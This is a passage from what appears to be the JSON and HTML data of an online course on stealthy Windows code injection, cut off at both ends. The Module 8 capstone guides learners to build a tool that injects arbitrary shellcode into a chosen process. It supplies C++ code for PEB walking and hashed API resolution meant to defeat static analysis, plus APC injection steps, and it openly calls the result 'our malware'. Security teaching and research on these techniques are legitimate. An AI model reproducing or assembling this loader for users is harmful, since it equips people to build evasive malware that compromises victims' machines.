Algorithm:</strong> Choose either the ROR13 example provided or another simple, fast hash function. Implement this as a C++ function, e.g., <code>DWORD CalculateAPIHash(const char* apiName)</code>.</li>\n<li><strong>Modify Your Resolver Function:</strong><ul>\n<li>Change the function signature of your custom <code>GetProcAddress</code> to accept a <code>DWORD</code> hash value instead of a <code>const char*</code> function name. Let&#39;s call it `LPVOID GetProcAddressByHash(</li>\n</ul>\n</li>\n</ol>\n\n                </div>\n             </div>\n         ",
    "module-8": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 8: module_8</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, welcome to the culmination of our journey! Module 8 is where we take all the powerful, low-level knowledge we&#39;ve acquired over the past seven modules ‚Äì understanding Windows internals, mastering different execution contexts (APCs, Native Threads, Fibers), dissecting the PE format, and building dynamic API resolution with evasion ‚Äì and synthesize it into a single, functional, stealthy tool.</p>\n<p>This isn&#39;t just an exercise; it&#39;s about building a core capability. The concepts here form the backbone of many advanced offensive tools and sophisticated malware loaders. We&#39;re moving from understanding individual components to constructing a system.</p>\n<p>Let&#39;s get building!</p>\n<hr>\n<h2><strong>Module 8: Capstone Project - Building Your Advanced Execution Framework</strong></h2>\n<p><strong>Module Objective:</strong> Integrate the advanced techniques learned throughout the course into a single, functional tool capable of executing arbitrary shellcode in a target process using multiple stealthy and resilient methods, demonstrating mastery of the course material.</p>\n<p><strong>Time Allotment:</strong> This module will likely take the most time, potentially spanning several sessions or a significant portion of your dedicated lab time. It&#39;s a building phase.</p>\n<hr>\n<h3><strong>8.1 Introduction: Synthesizing Knowledge into Capability</strong></h3>\n<p>We&#39;ve spent the last seven modules digging into the nitty-gritty:</p>\n<ul>\n<li>Module 1: Process/Thread/Memory deep dive.</li>\n<li>Module 2: APC Injection mechanics (<code>NtQueueApcThread</code>).</li>\n<li>Module 3: Native API power (<code>NtCreateThreadEx</code>, <code>NtAllocateVirtualMemory</code>).</li>\n<li>Module 4: Fibers and Context Manipulation (<code>SwitchToFiber</code>, <code>SetThreadContext</code>).</li>\n<li>Module 5: Unconventional paths (Window Messages, Callbacks).</li>\n<li>Module 6: Dynamic API Resolution (PE Parsing, EAT traversal).</li>\n<li>Module 7: Advanced Evasion (API Hashing, String Obfuscation).</li>\n</ul>\n<p>Now, it&#39;s time to combine these. Our goal is to create a tool that can:</p>\n<ol>\n<li>Take a target Process ID (PID) and a raw shellcode file as input.</li>\n<li>Allow the user to select an injection method (at least two from APC, Native Thread (<code>NtCreateThreadEx</code>), or potentially Fiber/Context manipulation if you got the stretch goals working).</li>\n<li>Read the shellcode from the file.</li>\n<li>Perform the injection into the target process.</li>\n<li><strong>CRITICALLY:</strong> Perform <em>all</em> necessary Windows/Native API calls (<code>OpenProcess</code>, memory allocation, writing, thread/APC creation, handle closing, etc.) using the <strong>dynamic API resolution framework</strong> you built in Modules 6 &amp; 7 (including hashing/obfuscation where applicable). No static imports beyond the absolute minimum startup code (like reading command line args, though even that could be avoided with more advanced techniques we won&#39;t cover here).</li>\n<li>Be reasonably robust and include basic error handling.</li>\n</ol>\n<p>Think of this as building your own mini-Metasploit <code>inject</code> payload handler, but with a focus on the stealthy, low-level mechanics we&#39;ve explored.</p>\n<h3><strong>8.2 Recap of Core Requirements for the Capstone Tool</strong></h3>\n<p>Let&#39;s be crystal clear about what your final tool needs to demonstrate:</p>\n<ul>\n<li><strong>Input:</strong> Target PID (integer), Shellcode file path (string), Injection method choice (e.g., command-line flag <code>--method apc</code> or <code>--method native</code>).</li>\n<li><strong>Core Functionality:</strong> Read shellcode, inject into target process, execute shellcode.</li>\n<li><strong>Injection Methods:</strong> Implement <em>at least two</em> distinct methods covered in the course (e.g., APC via <code>NtQueueApcThread</code>, Native Thread via <code>NtCreateThreadEx</code>).</li>\n<li><strong>API Resolution:</strong> <strong>All</strong> Windows API and Native API functions required for the injection process <em>must</em> be resolved dynamically at runtime.<ul>\n<li>This includes: <code>OpenProcess</code>, memory allocation (<code>VirtualAllocEx</code> or <code>NtAllocateVirtualMemory</code>), memory writing (<code>WriteProcessMemory</code> or <code>NtWriteVirtualMemory</code>), thread/APC creation (<code>CreateRemoteThreadEx</code> or <code>NtCreateThreadEx</code> or <code>QueueUserAPC</code> or <code>NtQueueApcThread</code>), handle closing (<code>CloseHandle</code> or <code>NtClose</code>), error checking functions (<code>GetLastError</code> or <code>NtStatus</code> checks).</li>\n<li>This dynamic resolution must leverage your PE parsing and EAT traversal logic from Module 6.</li>\n<li>Ideally, this resolution should use the API hashing logic from Module 7 to avoid cleartext function names.</li>\n<li><em>Advanced Challenge:</em> Even <code>LoadLibraryA</code>/<code>GetProcAddress</code> (or their Native equivalents) should be resolved dynamically, typically by manually parsing the Process Environment Block (PEB) to find the base addresses of <code>kernel32.dll</code> and <code>ntdll.dll</code>. This avoids <em>any</em> static import beyond the very initial program entry point. (We&#39;ll provide guidance on the PEB approach).</li>\n</ul>\n</li>\n<li><strong>Evasion:</strong> Integrate API hashing and potentially string obfuscation (Module 7) for DLL/function names used in the dynamic resolution process itself.</li>\n<li><strong>Environment:</strong> Build and test in your isolated lab environment (VM!).</li>\n</ul>\n<h3><strong>8.3 Architectural Design and Planning</strong></h3>\n<p>Before we write code, let&#39;s plan the structure. A simple command-line tool structure works well:</p>\n<pre><code>[main function]\n    -&gt; Parse command line arguments (PID, shellcode file, method)\n    -&gt; Read shellcode from file\n    -&gt; [Setup Dynamic API Resolver]\n        -&gt; Initialize resolver (e.g., parse PEB to find kernel32/ntdll base addresses)\n        -&gt; Resolve ALL necessary API function pointers using hashes/names\n        -&gt; Store resolved pointers (e.g., in a struct or global variables)\n    -&gt; [Open Target Process]\n        -&gt; Use resolved `OpenProcess` (or `NtOpenProcess`)\n        -&gt; Handle errors (e.g., permissions)\n    -&gt; [Select and Execute Injection Method]\n        -&gt; Based on user input (method flag):\n            -&gt; Call `ExecuteInjectionAPC(...)` function\n            -&gt; Call `ExecuteInjectionNativeThread(...)` function\n            // -&gt; Call `ExecuteInjectionFiber(...)` etc.\n    -&gt; [Cleanup]\n        -&gt; Use resolved `CloseHandle` (or `NtClose`) for process handle\n    -&gt; Report success/failure\n</code></pre>\n<p><strong>Key Design Considerations:</strong></p>\n<ol>\n<li><p><strong>Dynamic Resolver Implementation:</strong> How will you make your Module 6/7 code easily callable?</p>\n<ul>\n<li>Option A: A class <code>DynamicResolver</code> with a method like <code>GetProcAddressByHash(moduleHash, functionHash)</code>.</li>\n<li>Option B: A set of global function pointers that are populated by an <code>InitializeResolver()</code> function at the start of <code>main</code>. This is often simpler for small tools.</li>\n<li><em>PEB Parsing:</em> To avoid even <code>GetModuleHandleA</code>/<code>LoadLibraryA</code> as static imports or initial dynamic calls, you&#39;ll need to find module base addresses by walking the PEB. This is a common technique in shellcode and advanced loaders because the PEB&#39;s address is easily accessible (<code>FS</code> segment register on x86, <code>GS</code> on x64). We&#39;ll outline this.</li>\n</ul>\n</li>\n<li><p><strong>Storing Resolved Pointers:</strong> A <code>struct</code> is a clean way to hold all your resolved API function pointers:</p>\n<pre><code class=\"language-c++\">// Example struct to hold resolved function pointers\ntypedef struct _RESOLVED_APIS {\n    // kernel32.dll / WinAPI functions\n    FARPROC pOpenProcess;\n    FARPROC pVirtualAllocEx;\n    FARPROC pWriteProcessMemory;\n    FARPROC pCloseHandle;\n    FARPROC pGetLastError; // Or NtStatus checks if using Native\n\n    // ntdll.dll / Native API functions\n    FARPROC pNtOpenProcess; // Alternative to OpenProcess\n    FARPROC pNtAllocateVirtualMemory; // Alternative to VirtualAllocEx\n    FARPROC pNtWriteVirtualMemory; // Alternative to WriteProcessMemory\n    FARPROC pNtCreateThreadEx; // Alternative to CreateRemoteThreadEx\n    FARPROC pNtQueueApcThread; // For APC injection\n    FARPROC pNtClose; // Alternative to CloseHandle\n    FARPROC pNtGetNextThread; // For finding threads for APCs (less common, often iterate Snapshots instead)\n    // ... add others as needed\n} RESOLVED_APIS, *PRESOLVED_APIS;\n\nRESOLVED_APIS g_ResolvedAPIs; // Global instance\n</code></pre>\n</li>\n<li><p><strong>Error Handling:</strong> Since you&#39;re using low-level APIs and working across process boundaries, errors are frequent. Check return values of <em>every</em> API call. Use <code>GetLastError()</code> (resolved dynamically, of course!) or check <code>NTSTATUS</code> values and print informative messages.</p>\n</li>\n<li><p><strong>Shellcode Format:</strong> Keep it simple: a raw binary file containing the shellcode bytes. Read it into a <code>char*</code> or <code>BYTE*</code> buffer.</p>\n</li>\n</ol>\n<h3><strong>8.4 Step-by-Step Implementation Guide</strong></h3>\n<p>Let&#39;s break down the coding process.</p>\n<p><strong>Step 1: Project Setup and Boilerplate</strong></p>\n<ul>\n<li>Create a new C++ console project in your IDE (Visual Studio, or use GCC/Clang with MinGW/Cygwin).</li>\n<li>Include necessary headers. Since we&#39;re avoiding static imports, you might only need <code>&lt;windows.h&gt;</code> (for basic types like <code>HANDLE</code>, <code>DWORD</code>, <code>LPVOID</code>), <code>&lt;iostream&gt;</code> (for console output), <code>&lt;vector&gt;</code> (for shellcode buffer), <code>&lt;fstream&gt;</code> (for reading shellcode), <code>&lt;string&gt;</code>, <code>&lt;tchar.h&gt;</code> (if dealing with TCHARs, though byte strings are often simpler for low-level work), <code>&lt;winternl.h&gt;</code> (for <code>NTSTATUS</code>, <code>PPEB</code>, etc. - these structures/enums are often needed even if the functions are resolved dynamically).</li>\n<li>Add your hashing function code (Module 7).</li>\n<li>Add your PE parsing/EAT traversal code (Module 6).</li>\n<li>Define the <code>RESOLVED_APIS</code> struct.</li>\n</ul>\n<p><strong>Step 2: Implementing PEB Parsing for Initial Module Base Addresses</strong></p>\n<p>To achieve full dynamic resolution without relying on <code>GetModuleHandleA</code> or <code>LoadLibraryA</code> initially, we&#39;ll find the base addresses of <code>kernel32.dll</code> and <code>ntdll.dll</code> by walking the Process Environment Block (PEB). This requires a bit of low-level pointer magic and understanding the PEB structure.</p>\n<ul>\n<li><p>The PEB is pointed to by the <code>FS</code> register on x86 and <code>GS</code> on x64.</p>\n</li>\n<li><p>The PEB contains a pointer to the <code>PEB_LDR_DATA</code> structure, which in turn contains linked lists of loaded modules.</p>\n</li>\n<li><p>We can iterate these lists to find the modules we need (<code>ntdll.dll</code> and <code>kernel32.dll</code>) by comparing their names.</p>\n</li>\n<li><p><strong>Code Snippet (Conceptual - x64):</strong></p>\n<pre><code class=\"language-c++\">#include &lt;windows.h&gt;\n#include &lt;winternl.h&gt; // For PEB structures\n#include &lt;string&gt;\n#include &lt;vector&gt;\n\n// Define necessary types if winternl.h isn&#39;t sufficient or for clarity\n// For x64:\ntypedef struct _PEB_LDR_DATA_X64 {\n    DWORD       Reserved1[2];\n    PVOID       Reserved2[3];\n    LIST_ENTRY  InMemoryOrderModuleList;\n    // ... rest of structure\n} PEB_LDR_DATA_X64, *PPEB_LDR_DATA_X64;\n\ntypedef struct _LDR_DATA_TABLE_ENTRY_X64 {\n    LIST_ENTRY InLoadOrderLinks;\n    LIST_ENTRY InMemoryOrderLinks;\n    LIST_ENTRY InInitializationOrderLinks;\n    PVOID DllBase; // THIS is the base address we need!\n    PVOID EntryPoint;\n    ULONG SizeOfImage;\n    UNICODE_STRING FullDllName;\n    UNICODE_STRING BaseDllName; // THIS is the name we compare!\n    ULONG Flags;\n    USHORT LoadCount;\n    USHORT TlsIndex;\n    LIST_ENTRY HashLinks;\n    PVOID SectionPointer;\n    ULONG CheckSum;\n    ULONG TimeDateStamp;\n    PVOID LoadedImports;\n    PVOID EntryPointActivationContext;\n    PVOID PatchInformation;\n    LIST_ENTRY ForwarderLinks;\n    LIST_ENTRY ServiceTagLinks;\n    LIST_ENTRY StaticImportLinks;\n} LDR_DATA_TABLE_ENTRY_X64, *PLDR_DATA_TABLE_ENTRY_X64;\n\n// Function to get module base address via PEB parsing\n// Requires Module 6/7 PE parsing logic\n// Needs to handle UNICODE_STRING comparison\nHMODULE GetModuleBaseFromPEB(const std::wstring&amp; moduleName) {\n    // Get PEB address (x64 specific - uses GS register)\n    PPEB pPeb = (PPEB)__readgsqword(0x60); // 0x60 is the offset for PEB on x64\n\n    // Get LDR_DATA_TABLE_ENTRY list\n    PPEB_LDR_DATA pLdr = pPeb-&gt;Ldr; // For x64, use the direct field\n\n    // Walk the InLoadOrderModuleList (or InMemoryOrderModuleList)\n    // Note: The structure offsets and list names can vary slightly by OS version/architecture\n    // InMemoryOrderModuleList is often preferred as it&#39;s consistent\n    PLIST_ENTRY pListHead = &amp;pLdr-&gt;InMemoryOrderModuleList;\n    PLIST_ENTRY pListEntry = pListHead-&gt;Flink;\n\n    // The first entry is the executable, the second is ntdll, third is kernel32 usually,\n    // but iterating and comparing names is safer.\n    while (pListEntry != pListHead) {\n        // Calculate address of the LDR_DATA_TABLE_ENTRY from the LIST_ENTRY\n        // This offset is specific to the structure definition\n        // For x64, InMemoryOrderLinks is usually at offset 0x10 within LDR_DATA_TABLE_ENTRY_X64\n        PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pListEntry - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));\n\n        // Compare BaseDllName (UNICODE_STRING) with the target module name\n        // Need a helper to convert UNICODE_STRING to wstring/string for comparison\n        std::wstring currentModuleName(pEntry-&gt;BaseDllName.Buffer, pEntry-&gt;BaseDllName.Length / sizeof(WCHAR));\n\n        if (_wcsicmp(currentModuleName.c_str(), moduleName.c_str()) == 0) {\n            return (HMODULE)pEntry-&gt;DllBase; // Found it!\n        }\n\n        pListEntry = pListEntry-&gt;Flink; // Move to the next entry\n    }\n\n    return nullptr; // Not found\n}\n\n// Need a function to convert UNICODE_STRING to std::wstring for comparison\n// (Implementation omitted for brevity, but involves WideCharToMultiByte or similar)\n// Need to handle x86 PEB parsing (__readfsdword(0x30) for PEB pointer)\n</code></pre>\n</li>\n<li><p><strong>Important:</strong> PEB structure offsets and the list names/order can vary between Windows versions and architectures (x86 vs x64). The code above is a conceptual x64 example. You&#39;ll need to adapt it or find architecture-specific definitions. This is where relying on resources like <code>winternl.h</code> and careful debugging/analysis comes in.</p>\n</li>\n</ul>\n<p><strong>Step 3: Implementing the Full Dynamic Resolver Initialization</strong></p>\n<p>Combine the PEB parsing with your EAT traversal from Module 6/7.</p>\n<ul>\n<li><p>Create a function, e.g., <code>InitializeResolvedAPIs(PRESOLVED_APIS pApiStruct)</code>.</p>\n</li>\n<li><p>Inside this function:</p>\n<ul>\n<li>Call <code>GetModuleBaseFromPEB</code> to get the base address of <code>ntdll.dll</code>.</li>\n<li>Call <code>GetModuleBaseFromPEB</code> to get the base address of <code>kernel32.dll</code>.</li>\n<li>For each required API function listed in your <code>RESOLVED_APIS</code> struct:<ul>\n<li>Get the module base address (<code>ntdll_base</code> or <code>kernel32_base</code>).</li>\n<li>Calculate the hash of the function name string (using your Module 7 hash function).</li>\n<li>Call your Module 6/7 EAT parsing function (adapted to take base address and hash) to get the function pointer.</li>\n<li>Store the resulting pointer in the <code>pApiStruct</code>.</li>\n<li>Include robust error checking: If any required function fails to resolve, the initialization should fail, and the program should exit gracefully.</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Code Snippet (Conceptual):</strong></p>\n<pre><code class=\"language-c++\">#include &quot;YourDynamicResolverCode.h&quot; // Include your Module 6/7 code\n#include &quot;YourHashingCode.h&quot;        // Include your Module 7 code\n\n// Global struct instance\nRESOLVED_APIS g_ResolvedAPIs = { 0 }; // Initialize to null\n\nBOOL InitializeResolvedAPIs() {\n    // Step 1: Get module bases via PEB\n    HMODULE hNtdll = GetModuleBaseFromPEB(L&quot;ntdll.dll&quot;); // Need wstring comparison helper\n    HMODULE hKernel32 = GetModuleBaseFromPEB(L&quot;kernel32.dll&quot;);\n\n    if (!hNtdll || !hKernel32) {\n        // Handle error: Could not find essential modules\n        std::cerr &lt;&lt; &quot;[-] Failed to find essential modules via PEB.\\n&quot;;\n        return FALSE;\n    }\n\n    // Step 2: Resolve necessary APIs using EAT traversal (from Module 6/7)\n    // Adapt your GetProcAddressByHash function to take HMODULE and hash\n    // Example: FARPROC GetProcAddressByHash(HMODULE hModule, DWORD functionHash);\n\n    // Resolve kernel32.dll APIs\n    g_ResolvedAPIs.pOpenProcess = GetProcAddressByHash(hKernel32, HashString(&quot;OpenProcess&quot;)); // Need your hashing function\n    g_ResolvedAPIs.pVirtualAllocEx = GetProcAddressByHash(hKernel32, HashString(&quot;VirtualAllocEx&quot;));\n    g_ResolvedAPIs.pWriteProcessMemory = GetProcAddressByHash(hKernel32, HashString(&quot;WriteProcessMemory&quot;));\n    g_ResolvedAPIs.pCloseHandle = GetProcAddressByHash(hKernel32, HashString(&quot;CloseHandle&quot;));\n    g_ResolvedAPIs.pGetLastError = GetProcAddressByHash(hKernel32, HashString(&quot;GetLastError&quot;));\n\n    // Resolve ntdll.dll APIs\n    g_ResolvedAPIs.pNtOpenProcess = GetProcAddressByHash(hNtdll, HashString(&quot;NtOpenProcess&quot;));\n    g_ResolvedAPIs.pNtAllocateVirtualMemory = GetProcAddressByHash(hNtdll, HashString(&quot;NtAllocateVirtualMemory&quot;));\n    g_ResolvedAPIs.pNtWriteVirtualMemory = GetProcAddressByHash(hNtdll, HashString(&quot;NtWriteVirtualMemory&quot;));\n    g_ResolvedAPIs.pNtCreateThreadEx = GetProcAddressByHash(hNtdll, HashString(&quot;NtCreateThreadEx&quot;));\n    g_ResolvedAPIs.pNtQueueApcThread = GetProcAddressByHash(hNtdll, HashString(&quot;NtQueueApcThread&quot;));\n    g_ResolvedAPIs.pNtClose = GetProcAddressByHash(hNtdll, HashString(&quot;NtClose&quot;));\n    // Resolve other ntdll functions if needed for specific techniques (e.g., NtGetNextThread for APC target)\n\n    // Step 3: Check if ALL required APIs were resolved\n    // This is crucial! Add checks for every pointer you need.\n    if (!g_ResolvedAPIs.pOpenProcess || !g_ResolvedAPIs.pVirtualAllocEx || /* ... other checks ... */) {\n         std::cerr &lt;&lt; &quot;[-] Failed to resolve one or more required APIs.\\n&quot;;\n         // You might print which ones failed based on individual checks\n         return FALSE;\n    }\n\n    std::cout &lt;&lt; &quot;[+] Successfully resolved all required APIs.\\n&quot;;\n    return TRUE;\n}\n\n// Helper function to call GetLastError using the resolved pointer\nDWORD GetLastErrorResolved() {\n    if (g_ResolvedAPIs.pGetLastError) {\n        // Cast the FARPROC to the function pointer type and call it\n        typedef DWORD (WINAPI* GetLastErrorFn)();\n        GetLastErrorFn pfnGetLastError = (GetLastErrorFn)g_ResolvedAPIs.pGetLastError;\n        return pfnGetLastError();\n    }\n    return 0; // Default or error value if resolver failed\n}\n\n// Example macro for calling resolved APIs safely\n#define CALL_RESOLVED_API(api_ptr, ...) \\\n    (((decltype(&amp;api_ptr))api_ptr)(__VA_ARGS__))\n\n// Example usage:\n// HANDLE hProc = CALL_RESOLVED_API(g_ResolvedAPIs.pOpenProcess, ...);\n// DWORD err = GetLastErrorResolved();\n// NTSTATUS status = CALL_RESOLVED_API(g_ResolvedAPIs.pNtAllocateVirtualMemory, ...);\n</code></pre>\n</li>\n<li><p><strong>String Obfuscation (Module 7):</strong> Instead of using literal strings <code>&quot;OpenProcess&quot;</code>, <code>&quot;ntdll.dll&quot;</code>, etc., calculate their hashes <em>at compile time</em> (if your hashing function allows <code>constexpr</code>) or obfuscate the strings and deobfuscate them <em>at runtime</em> just before calculating the hash for the EAT lookup. This makes static analysis harder.</p>\n</li>\n</ul>\n<p><strong>Step 4: Reading Shellcode from File</strong></p>\n<p>Standard file I/O. Read the entire content of the shellcode file into a <code>std::vector&lt;BYTE&gt;</code> or <code>BYTE*</code> buffer.</p>\n<ul>\n<li><p><strong>Code Snippet:</strong></p>\n<pre><code class=\"language-c++\">#include &lt;fstream&gt;\n#include &lt;vector&gt;\n\n// Function to read shellcode from a file\nstd::vector&lt;BYTE&gt; ReadShellcodeFile(const std::string&amp; filePath) {\n    std::ifstream file(filePath, std::ios::binary | std::ios::ate);\n    if (!file.is_open()) {\n        std::cerr &lt;&lt; &quot;[-] Failed to open shellcode file: &quot; &lt;&lt; filePath &lt;&lt; &quot;\\n&quot;;\n        return {}; // Return empty vector on failure\n    }\n\n    std::streamsize fileSize = file.tellg();\n    file.seekg(0, std::ios::beg);\n\n    std::vector&lt;BYTE&gt; buffer(fileSize);\n    if (!file.read(reinterpret_cast&lt;char*&gt;(buffer.data()), fileSize)) {\n        std::cerr &lt;&lt; &quot;[-] Failed to read shellcode file: &quot; &lt;&lt; filePath &lt;&lt; &quot;\\n&quot;;\n        return {};\n    }\n\n    std::cout &lt;&lt; &quot;[+] Read &quot; &lt;&lt; fileSize &lt;&lt; &quot; bytes of shellcode from &quot; &lt;&lt; filePath &lt;&lt; &quot;\\n&quot;;\n    return buffer;\n}\n</code></pre>\n</li>\n</ul>\n<p><strong>Step 5: Implementing Injection Method 1 (e.g., APC)</strong></p>\n<p>This function will encapsulate the APC injection logic from Module 2, but using the dynamically resolved APIs stored in <code>g_ResolvedAPIs</code>.</p>\n<ul>\n<li><p><strong>Function Signature:</strong> <code>BOOL ExecuteInjectionAPC(DWORD targetPid, const std::vector&lt;BYTE&gt;&amp; shellcode)</code></p>\n</li>\n<li><p><strong>Steps (using resolved APIs):</strong></p>\n<ol>\n<li>Get a handle to the target process: <code>HANDLE hProcess = CALL_RESOLVED_API(g_ResolvedAPIs.pOpenProcess, PROCESS_ALL_ACCESS, FALSE, targetPid);</code> (Or use <code>pNtOpenProcess</code>). Check handle validity.</li>\n<li>Allocate memory in the target process: <code>LPVOID remoteBuffer = CALL_RESOLVED_API(g_ResolvedAPIs.pVirtualAllocEx, hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</code> (Or use <code>pNtAllocateVirtualMemory</code>). Check allocated address.</li>\n<li>Write shellcode to the allocated memory: <code>BOOL writeSuccess = CALL_RESOLVED_API(g_ResolvedAPIs.pWriteProcessMemory, hProcess, remoteBuffer, shellcode.data(), shellcode.size(), NULL);</code> (Or use <code>pNtWriteVirtualMemory</code>). Check success.</li>\n<li>Find a suitable thread in the target process. This is slightly tricky without static imports like <code>CreateToolhelp32Snapshot</code>. You might need to resolve <code>CreateToolhelp32Snapshot</code>, <code>Thread32First</code>, <code>Thread32Next</code> dynamically as well, or rely on <code>NtGetNextThread</code> if you resolved it (less common). A simpler approach for a POC might be to target the main thread (often the first one enumerated or thread ID != PID).</li>\n<li>Get a handle to the target thread: <code>HANDLE hThread = CALL_RESOLVED_API(g_ResolvedAPIs.pOpenThread, THREAD_ALL_ACCESS, FALSE, targetThreadId);</code> (Need <code>pOpenThread</code> resolved, or use <code>NtOpenThread</code>). Check handle validity.</li>\n<li>Queue the APC: <code>DWORD queueSuccess = CALL_RESOLVED_API(g_ResolvedAPIs.pQueueUserAPC, (PAPCFUNC)remoteBuffer, hThread, NULL);</code> (Need <code>pQueueUserAPC</code> resolved, or use <code>pNtQueueApcThread</code> which is <code>NTSTATUS</code> based). Check success.</li>\n<li>Close handles: <code>CALL_RESOLVED_API(g_ResolvedAPIs.pCloseHandle, hThread); CALL_RESOLVED_API(g_ResolvedAPIs.pCloseHandle, hProcess);</code> (Or <code>pNtClose</code>).</li>\n</ol>\n</li>\n<li><p><strong>Error Checking:</strong> After <em>every</em> API call, check the return value. If it indicates failure, print an error message (including <code>GetLastErrorResolved()</code>) and return <code>FALSE</code>.</p>\n</li>\n</ul>\n<p><strong>Step 6: Implementing Injection Method 2 (e.g., Native Thread)</strong></p>\n<p>This function will encapsulate the <code>NtCreateThreadEx</code> injection logic from Module 3, using dynamically resolved APIs.</p>\n<ul>\n<li><strong>Function Signature:</strong> <code>BOOL ExecuteInjectionNativeThread(DWORD targetPid, const std::vector&lt;BYTE&gt;&amp; shellcode)</code></li>\n<li>**Steps (using</li>\n</ul>\n\n                </div>\n             </div>\n         "
  },
  "sidebarOverview": "\n         <div class=\"card course-progress-card\">\n             <h3>Course Progress</h3>\n             <!-- Progress bar placeholder -->\n             <div class=\"progress-bar-container\">\n                 <div class=\"progress-bar\" style=\"width: 0%;\"></div>\n             </div>\n             <p>0% Complete</p>\n             <p>0/8 modules completed</p>\n             <button>Continue Learning</button>\n         </div>\n         <div class=\"card\">\n             <h3>What You'll Learn</h3>\n             <div class=\"markdown-content text-center\"> <p>Coming Soon</p>\n </div> <!-- Placeholder Coming Soon -->\n         </div>\n         <div class=\"card\">\n             <h3>Requirements</h3>\n              <div class=\"markdown-content text-center\"> <p>Coming Soon</p>\n </div> <!-- Placeholder Coming Soon -->\n         </div>\n     ",
  "rawModules": [
    {
      "title": "module_1",
      "description": "module_1 Overview",
      "order": 1,
      "content": "Okay team, strap in! Welcome to Module 1. This is where we build the rock-solid foundation upon which all our advanced techniques will rest. Forget the surface-level stuff; we're going deep into the mechanics of how Windows actually runs code. Think of this as learning the blueprints before you start building a skyscraper ‚Äì you need to know where the load-bearing walls are, how the plumbing works, and the difference between a beam and a joist.\r\n\r\nOur goal in this module is to get intimately familiar with the environment our malware will operate in: the Windows process. We'll dissect it, understand its components, and see the different ways code can exist and execute within it. This isn't just theory; this knowledge directly informs *why* certain injection and evasion techniques work, and why others fail or get caught.\r\n\r\n---\r\n\r\n## **Module 1: Setting the Stage - Advanced Process Internals and Execution Contexts**\r\n\r\n**Time Allotment:** (Estimate: 4-6 hours, including exercises)\r\n\r\n**Module Objective Recap:** Understand the advanced architecture of Windows processes, threads, and memory, and identify the different execution contexts available for code injection beyond simple thread creation.\r\n\r\n**Prerequisites Recap:**\r\n*   Basic C/C++ coding skills.\r\n*   Familiarity with fundamental Windows concepts (what a process is, what a thread is at a high level).\r\n*   A working C/C++ development environment (Visual Studio, MinGW/GCC, or Cygwin/Clang).\r\n*   A debugger (WinDbg or x64dbg recommended).\r\n*   Ideally, a dedicated Virtual Machine for lab work ‚Äì *seriously, use a VM for this stuff!*\r\n\r\n---\r\n\r\n### **1.1 The Windows Process: More Than Just an Executable**\r\n\r\nAlright, let's start with the fundamental container: the process. You probably know it as \"an instance of a running program.\" That's true, but it's much more. A process is an isolated environment provided by the operating system to contain and manage the resources needed for a program to run.\r\n\r\n**What's in a Process?**\r\n\r\nThink of a process as a self-contained universe for your program. Its key components include:\r\n\r\n*   **Private Virtual Address Space:** This is *crucial*. Every process gets its *own* virtual memory space. On 64-bit Windows, this space is a massive 128 Terabytes (though typically only a fraction is actually used or addressable by user-mode code). On 32-bit Windows, it's 4GB (with variations depending on configuration). Why virtual? Because the addresses your program sees (virtual addresses) are translated by the CPU's Memory Management Unit (MMU) with help from the OS into physical RAM addresses. This provides isolation ‚Äì one process cannot directly access the memory of another process without explicit OS permission (which we'll leverage!).\r\n*   **Executable Code:** The program's instructions, loaded from the `.exe` file and any required `.dll` files.\r\n*   **Data:** Global variables, static variables, dynamically allocated memory (heap).\r\n*   **Resources:** Handles to objects like files, network sockets, synchronization objects (mutexes, events), UI elements (windows, menus), etc.\r\n*   **Threads:** The actual units of execution. A process *must* have at least one thread (the primary thread), but can have many. Threads share the process's resources, *especially* the virtual address space.\r\n\r\n**User-Mode vs. Kernel-Mode Address Space**\r\n\r\nThis is a critical distinction. The virtual address space is divided into two major regions:\r\n\r\n*   **User-Mode:** This is where your application code runs. Access is restricted. If your code tries to access memory outside its allocated user-mode space (or memory it doesn't have permission for), you get an Access Violation (the dreaded crash!).\r\n*   **Kernel-Mode:** This space is reserved for the Windows kernel, device drivers, and other core OS components. Kernel-mode code has full access to *all* memory and hardware. User-mode code *cannot* directly access kernel-mode memory or execute kernel-mode instructions. Communication happens via carefully controlled transitions (like system calls, which we'll touch on later).\r\n\r\nOn 64-bit Windows, the split is typically 0x0000000000000000 to 0x00007FFFFFFFFFFF for user-mode and 0xFFFF800000000000 upwards for kernel-mode. The gap in between is deliberately unmapped.\r\n\r\n**Why is this important for us?**\r\nWhen we perform injection, we are typically operating *within* the target process's user-mode address space. We need to find or create space there (`VirtualAllocEx`), write our code/data there (`WriteProcessMemory`), and then find a way to make a thread *in that target process* execute code *at the address where we wrote our payload*. Understanding the address space helps us visualize where our code lives and the boundaries we must respect (or find ways around).\r\n\r\n### **1.2 Threads: The Engines of Execution**\r\n\r\nWhile the process is the container, threads are the actual workers. A thread is the smallest unit of execution that the Windows scheduler manages. Each thread has its own:\r\n\r\n*   **Execution Context:** This includes the CPU's registers (Instruction Pointer/Program Counter - `RIP`/`EIP`, stack pointer - `RSP`/`ESP`, base pointer - `RBP`/`EBP`, general purpose registers, flags register, etc.). This context is saved and restored by the OS when switching between threads.\r\n*   **Stack:** Each thread gets its own stack within the process's virtual address space. The stack is used for local variables, function parameters, and return addresses during function calls.\r\n*   **Thread Information Block (TIB):** A per-thread data structure maintained by the OS (and accessible from user-mode) that stores thread-specific information. This includes:\r\n    *   Pointer to the thread's Stack Base and Stack Limit.\r\n    *   Thread Local Storage (TLS) array/directory.\r\n    *   Structured Exception Handling (SEH) frame list.\r\n    *   A pointer to the Process Environment Block (PEB) (shared by all threads in the process).\r\n    *   Other thread-specific flags and data.\r\n    The `FS` register on x86 and the `GS` register on x64 are typically used to point to the beginning of the TIB in user-mode, making it quickly accessible. This is a low-level detail often used in shellcode or highly optimized code, and a concept sometimes explored in texts like `zhasslan.txt` when discussing manual stack walking or accessing thread-local data.\r\n\r\n**Thread States and Scheduling**\r\n\r\nThreads transition through various states:\r\n\r\n*   **Running:** Currently executing on a CPU core.\r\n*   **Ready:** Waiting to be scheduled on a CPU core.\r\n*   **Waiting:** Paused, waiting for some event to occur (e.g., waiting for I/O completion, waiting on a synchronization object, sleeping, or *waiting in an alertable state*).\r\n*   **Terminated:** Finished execution.\r\n\r\nThe OS scheduler decides which 